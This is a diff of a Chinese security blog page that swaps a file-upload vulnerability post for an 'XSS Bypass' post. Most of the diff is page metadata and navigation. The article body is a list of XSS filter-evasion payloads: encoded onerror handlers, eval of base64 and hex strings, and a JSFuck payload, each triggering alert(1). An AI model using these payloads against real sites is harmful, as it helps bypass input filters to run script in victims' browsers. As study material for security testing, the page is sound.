@@ -3,23 +3,23 @@
 <head>
     <meta charset="utf-8">
     
-    <title>文件上传解析漏洞总结 | 披着羊皮的狼</title>
+    <title>XSS Bypass | 披着羊皮的狼</title>
     
     
-        <meta name="keywords" content="文件上传解析漏洞" />
+        <meta name="keywords" content="XSS" />
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="关于解析漏洞的总结">
+    <meta name="description" content="XSS Bypass">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件上传解析漏洞总结">
-<meta property="og:url" content="http://zzqsmile.top/2018/06/06/web%E5%AE%89%E5%85%A8/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:title" content="XSS Bypass">
+<meta property="og:url" content="http://zzqsmile.top/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Bypass/index.html">
 <meta property="og:site_name" content="披着羊皮的狼">
-<meta property="og:description" content="关于解析漏洞的总结">
+<meta property="og:description" content="XSS Bypass">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2018-06-06T01:00:00.000Z">
-<meta property="article:modified_time" content="2020-10-18T07:59:27.017Z">
+<meta property="article:published_time" content="2020-10-18T12:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-18T08:12:59.127Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="文件上传解析漏洞">
+<meta property="article:tag" content="XSS">
 <meta name="twitter:card" content="summary">
     
 
@@ -253,9 +253,18 @@
                             &nbsp;
                             MYSQL
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/04/01/web%E5%AE%89%E5%85%A8/sqli-labs-Less1/">sqli-labs Less-1</a></li>  <li class="file"><a href="/2018/06/06/web%E5%AE%89%E5%85%A8/mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B9%8Bfloor/">mysql报错注入原理分析之floor()</a></li>  <li class="file"><a href="/2018/06/18/web%E5%AE%89%E5%85%A8/sql%E7%9B%B2%E6%B3%A8%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%E4%B9%8Bdnslog/">SQL注入奇淫技巧——利用dnslog获取看不到的信息</a></li>  <li class="file"><a href="/2018/11/12/web%E5%AE%89%E5%85%A8/Order_by%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/">Order by排序注入方法小总结</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/04/01/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sqli-labs-Less1/">sqli-labs Less-1</a></li>  <li class="file"><a href="/2018/06/06/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B9%8Bfloor/">mysql报错注入原理分析之floor()</a></li>  <li class="file"><a href="/2018/06/18/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E7%9B%B2%E6%B3%A8%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%E4%B9%8Bdnslog/">SQL注入奇淫技巧——利用dnslog获取看不到的信息</a></li>  <li class="file"><a href="/2018/11/12/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/Order_by%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/">Order by排序注入方法小总结</a></li>  </ul> 
                     </li> 
                      </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            XSS
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file active"><a href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Bypass/">XSS Bypass</a></li>  <li class="file"><a href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Payload/">XSS Payload</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -264,16 +273,16 @@
                             &nbsp;
                             XXE
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/">XXE漏洞笔记</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/XXE/">XXE漏洞笔记</a></li>  </ul> 
                     </li> 
                     
-                    <li class="directory open">
+                    <li class="directory">
                         <a href="#" data-role="directory">
-                            <i class="fa fa-folder-open"></i>
+                            <i class="fa fa-folder"></i>
                             &nbsp;
                             文件上传/解析
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file active"><a href="/2018/06/06/web%E5%AE%89%E5%85%A8/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件上传解析漏洞总结</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/06/06/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件上传解析漏洞总结</a></li>  </ul> 
                     </li> 
                      <li class="file"><a href="/2019/04/04/%E4%BC%A0%E9%80%81%E9%97%A8/CORS/">跨域资源共享CORS</a></li>  </ul> 
                     </li> 
@@ -420,7 +429,7 @@
     <div id="toTop" class="fa fa-angle-up"></div>
 </aside>
             
-            <section id="main"><article id="post-web安全/解析漏洞总结" class="article article-type-post" itemscope itemprop="blogPost">
+            <section id="main"><article id="post-web安全/XSS/XSS Bypass" class="article article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
         
@@ -430,20 +439,20 @@
                         
     <div class="article-category">
     	<i class="fa fa-folder"></i>
-        <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E8%A7%A3%E6%9E%90/">文件上传/解析</a>
+        <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/XSS/">XSS</a>
     </div>
 
                         
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" rel="tag">文件上传解析漏洞</a>
+        <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
     </div>
 
                         
     <div class="article-date">
         <i class="fa fa-calendar"></i>
-        <a href="/2018/06/06/web%E5%AE%89%E5%85%A8/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
-            <time datetime="2018-06-06T01:00:00.000Z" itemprop="datePublished">2018-06-06</time>
+        <a href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Bypass/">
+            <time datetime="2020-10-18T12:00:00.000Z" itemprop="datePublished">2020-10-18</time>
         </a>
     </div>
 
@@ -454,13 +463,13 @@
                         
                         
                             <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/raw/writing/source/_posts/web安全/解析漏洞总结.md'> Source </a>
+                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/raw/writing/source/_posts/web安全/XSS/XSS Bypass.md'> Source </a>
                             </div>
                             <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/edit/writing/source/_posts/web安全/解析漏洞总结.md'> Edit </a>
+                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/edit/writing/source/_posts/web安全/XSS/XSS Bypass.md'> Edit </a>
                             </div>
                             <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/commits/writing/source/_posts/web安全/解析漏洞总结.md'> History </a>
+                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/commits/writing/source/_posts/web安全/XSS/XSS Bypass.md'> History </a>
                             </div>
                         
                     </div>
@@ -468,7 +477,7 @@
                 
     
         <h1 class="article-title" itemprop="name">
-            文件上传解析漏洞总结
+            XSS Bypass
         </h1>
     
 
@@ -481,12 +490,10 @@
             
         
         
-            <p>关于解析漏洞的总结</p>
+            <p>XSS Bypass</p>
 <a id="more"></a>
 
-<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/3750.html">传送门</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/53533.html">我的WafBypass之道(upload篇)</a></p>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&quot;eval(atob(&#39;YWxlcnQoMSk&#x3D;&#39;))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT LANGUAGE&#x3D;&quot;JavaScript&quot;&gt;</span><br><span class="line">eval(&quot;\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29&quot;)</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    Notification.requestPermission(x&#x3D;&gt;&#123;new(Notification)(1)&#125;)</span><br><span class="line">new(Notification)(1)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- \+ASCII码的8位形式 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;[][&quot;\146\151\154\164\145\162&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&quot;\141\154\145\162\164\050\061\051&quot;)()&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- top使用 --&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;top[&#39;ale&#39;+&#39;rt&#39;](1)&gt;</span><br><span class="line">&lt;input autofocus onfocus&#x3D;&quot;top[&#39;aler&#39;+&#39;t&#39;]&#96;1&#96;&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- \u十六进制编码 --&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;\u0061\u006c\u0065\u0072\u0074(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- &amp;#x;十六进制编码 --&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- &amp;#十进制编码 --&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&amp;#000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- &amp;#;十进制编码 --&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- JSFUCK --&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- https:&#x2F;&#x2F;github.com&#x2F;heroanswer&#x2F;XSS_Cheat_Sheet_2020_Edition --&gt;</span><br></pre></td></tr></table></figure>
             </div>
         
         <footer class="article-footer">
@@ -498,19 +505,19 @@
     
 <nav id="article-nav">
     
-        <a href="/2018/06/06/web%E5%AE%89%E5%85%A8/mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B9%8Bfloor/" id="article-nav-newer" class="article-nav-link-wrap">
+        <a href="/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%8F%82%E8%80%83/" id="article-nav-newer" class="article-nav-link-wrap">
             <strong class="article-nav-caption">Newer</strong>
             <div class="article-nav-title">
                 
-                    mysql报错注入原理分析之floor()
+                    参考
                 
             </div>
         </a>
     
     
-        <a href="/2018/06/05/python3/2018-06-05-%E6%8A%A5%E9%94%99/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Payload/" id="article-nav-older" class="article-nav-link-wrap">
             <strong class="article-nav-caption">Older</strong>
-            <div class="article-nav-title">python脚本实现半自动化报错注入</div>
+            <div class="article-nav-title">XSS Payload</div>
         </a>
     
 </nav>
